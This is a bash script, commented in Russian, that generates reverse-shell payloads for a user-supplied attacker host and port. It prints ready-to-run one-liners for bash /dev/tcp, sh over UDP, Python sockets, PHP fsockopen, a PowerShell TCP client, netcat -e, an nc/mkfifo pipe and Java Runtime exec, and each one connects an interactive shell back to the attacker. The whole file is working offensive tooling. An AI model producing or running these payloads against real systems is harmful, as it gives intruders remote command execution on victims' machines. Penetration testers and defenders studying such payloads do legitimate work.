#!/usr/bin/env bash
# revshell.sh — генератор реверс-шеллов. Своё, проверено руками.
# юзаж: ./revshell.sh <lhost> <lport> [bash|sh|python|php|powershell|nc|mkfifo|java]
set -euo pipefail

LHOST="${1:?usage: revshell.sh LHOST LPORT [type]}"
LPORT="${2:?usage: revshell.sh LHOST LPORT [type]}"
TYPE="${3:-bash}"

case "$TYPE" in
  bash)
    echo "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
    ;;
  sh)
    echo "sh -i >& /dev/udp/$LHOST/$LPORT 0>&1"
    ;;
  python)
    cat <<EOF
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$LHOST",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
EOF
    ;;
  php)
    cat <<EOF
php -r '\$sock=fsockopen("$LHOST",$LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'
EOF
    ;;
  powershell)
    cat <<EOF
powershell -nop -c "\$c=New-Object Net.Sockets.TCPClient('$LHOST',$LPORT);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);\$o=(iex \$d 2>&1|Out-String);\$o2=\$o+'PS '+(pwd).Path+'> ';\$sb=([Text.Encoding]::ASCII).GetBytes(\$o2);\$s.Write(\$sb,0,\$sb.Length);\$s.Flush()};\$c.Close()"
EOF
    ;;
  nc)
    echo "nc -e /bin/sh $LHOST $LPORT    # или: rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $LHOST $LPORT >/tmp/f"
    ;;
  mkfifo)
    echo "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $LHOST $LPORT > /tmp/f"
    ;;
  java)
    cat <<EOF
r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/$LHOST/$LPORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor()
EOF
    ;;
  *)
    echo "unknown type: $TYPE" >&2; exit 1
    ;;
esac
